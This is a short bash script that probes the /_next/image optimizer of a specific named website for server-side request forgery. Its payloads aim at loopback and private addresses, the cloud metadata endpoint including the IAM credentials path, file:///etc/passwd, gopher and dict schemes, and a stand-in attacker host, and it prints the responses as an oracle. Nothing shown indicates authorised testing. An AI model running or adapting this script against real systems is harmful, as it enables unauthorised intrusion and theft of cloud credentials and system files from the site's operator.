#!/bin/bash
# _next/image optimizer = real SSRF-capable fetch sink. Map its error oracle first.
T="https://www.infinitycapital.bh/_next/image"
UA="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36"

probe () {
  local label="$1"; local u="$2"
  local code=$(curl -sk -A "$UA" -o /tmp/img_body -w "%{http_code}" -G "$T" --data-urlencode "url=$u" --data "w=640" --data "q=75")
  local sz=$(wc -c < /tmp/img_body)
  local body=$(head -c 200 /tmp/img_body | tr -d '\n')
  echo "[$label] code=$code size=$sz body=$body"
}

probe "ALLOWED_ctfassets" "https://images.ctfassets.net/yts1dx0j7jj5/1GCT0vyjqmOwm2OL1YVpD1/2ab55f8b5189afa153eac5cb97f7f6d4/Ahmed_Taleb_updated-min.jpg"
probe "EVIL_external_host" "http://evil.example.org/x.png"
probe "LOOPBACK" "http://127.0.0.1/"
probe "LOOPBACK_8090" "http://127.0.0.1:8090/"
probe "METADATA" "http://169.254.169.254/latest/meta-data/"
probe "METADATA_imds2" "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
probe "LOCALHOST_name" "http://localhost:3000/"
probe "PRIVATE_10" "http://10.0.0.1/"
probe "FILE_scheme" "file:///etc/passwd"
probe "GOPHER" "gopher://127.0.0.1:25/"
probe "DICT" "dict://127.0.0.1:11211/"
probe "redirector" "https://www.infinitycapital.bh/_next/image"
